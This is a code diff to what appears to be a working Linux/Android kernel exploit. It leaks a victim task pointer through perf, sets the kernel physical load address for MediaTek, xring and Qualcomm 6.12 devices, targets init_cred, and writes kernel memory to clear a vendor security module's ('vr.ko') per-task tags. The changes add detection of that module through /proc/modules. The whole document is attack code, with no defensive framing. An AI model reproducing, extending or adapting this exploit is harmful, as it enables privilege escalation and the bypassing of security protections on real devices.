@@ -99,21 +99,24 @@ static enum soc_family detect_soc(void) {
 static struct kernel_offsets g_external_offsets;
 static char g_external_release[192];
 
-/* Publish the active entry's init_cred image address and the physical load
- * address (MTK always loads at the DRAM base, text_offset=0). */
+/* Entries carry a phys load address only when measured; otherwise MTK uses
+ * the DRAM base, xring its constant, qcom its GKI version. */
 static void publish_active_offsets(void) {
   g_init_cred_image = INIT_CRED;
+  enum soc_family soc = detect_soc();
+  const char *soc_name =
+      soc == SOC_MTK ? "mtk" : soc == SOC_XRING ? "xring" : "qcom/other";
   if (active_offsets->kernel_phys_load) {
     p0_kernel_phys_load = active_offsets->kernel_phys_load;
-  }
-  enum soc_family soc = detect_soc();
-  const char *soc_name = "qcom/other";
-  if (soc == SOC_MTK) {
+  } else if (soc == SOC_MTK) {
     p0_kernel_phys_load = KIMAGE_TEXT_BASE - MTK_VADDR_BASE;
     soc_name = "mtk";
   } else if (soc == SOC_XRING) {
     p0_kernel_phys_load = XRING_KERNEL_PHYS_LOAD;
     soc_name = "xring";
+  } else if (strncmp(active_offsets->uname_r, "6.12.", 5) == 0) {
+    p0_kernel_phys_load = QC_GKI_6_12_PHYS_LOAD;
+    soc_name = "qcom/6.12";
   }
   pr_info("soc: %s; kernel_phys_load=0x%llx\n",
           soc_name, (unsigned long long)p0_kernel_phys_load);
@@ -821,6 +824,17 @@ static pid_t spawn_child(struct child_pipes *p) {
   return child;
 }
 
+/* Fork the victim and read back the task pointer perf leaked. */
+static pid_t spawn_victim(struct child_pipes *p, uintptr_t *task_out) {
+  pid_t child = spawn_child(p);
+  if (child < 0) return -1;
+  uintptr_t task = 0;
+  ssize_t nr = read(p->task_r, &task, sizeof(task));
+  close(p->task_r);
+  *task_out = (nr == (ssize_t)sizeof(task)) ? task : 0;
+  return child;
+}
+
 typedef int (*write_stage_verify_fn)(void *context);
 
 static int retry_write_stage(
@@ -1001,15 +1015,11 @@ int run_exploit(int argc, char **argv) {
       seccomp_ok = 0;
     }
 
-    child = spawn_child(&pipes);
+    child = spawn_victim(&pipes, &child_task);
     if (child < 0) {
       pr_warning("fork failed\n");
       return 1;
     }
-
-    child_task = 0;
-    read(pipes.task_r, &child_task, sizeof(child_task));
-    close(pipes.task_r);
     TIMER("perf_find_task done");
 
     if (!child_task) {
@@ -1017,9 +1027,11 @@ int run_exploit(int argc, char **argv) {
       pr_warning("perf leak did not reproduce; retrying next round\n");
       kill(-child, SIGKILL);
       waitpid(child, NULL, 0);
+
       child_alive = 0;
       close(pipes.cmd_w); close(pipes.uid_r);
       continue;
+
     }
 
     pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
@@ -1040,22 +1052,39 @@ int run_exploit(int argc, char **argv) {
    *     safe on your 6.1.145 kernel; if not, comment out the tagB write.
    * ------------------------------------------------------------------ */
   {
-    int vr_ok = 1;
-
-    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
-    vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
-                          "VR: flags+tagA", 1, 1);
-
-    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
-    if (vr_ok) {
-      uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
-      vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+    static int vr_needed = -1;
+    if (vr_needed < 0) {
+      vr_needed = 1; /* /proc/modules unreadable: assume loaded */
+      FILE *m = fopen("/proc/modules", "r");
+      if (m) {
+        char mod[256];
+        vr_needed = 0;
+        while (fgets(mod, sizeof(mod), m))
+          if (!strncasecmp(mod, "vr", 2) && (mod[2] == ' ' || mod[2] == '_'))
+            { vr_needed = 1; break; }
+        fclose(m);
+      }
+      pr_info("vr.ko %s\n", vr_needed ? "loaded; clearing tags"
+                                      : "not loaded; skipping tag clear");
     }
 
-    if (vr_ok) {
-      pr_success("VR.ko per-task tags cleared\n");
-    } else {
-      pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+    int vr_ok = 1;
+    if (vr_needed) {
+      /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+      vr_ok &= do_one_write(child_task + TASK_THREAD_INFO_FLAGS_OFF,
+                            "VR: flags+tagA", 1, 1);
+
+      /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+      if (vr_ok) {
+        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+        vr_ok &= do_one_write(tagb_align, "VR: tagB", 1, 1);
+      }
+
+      if (vr_ok) {
+        pr_success("VR.ko per-task tags cleared\n");
+      } else {
+        pr_warning("VR.ko tag clear failed; child may be killed during W2 verify\n");
+      }
     }
   }
 #endif
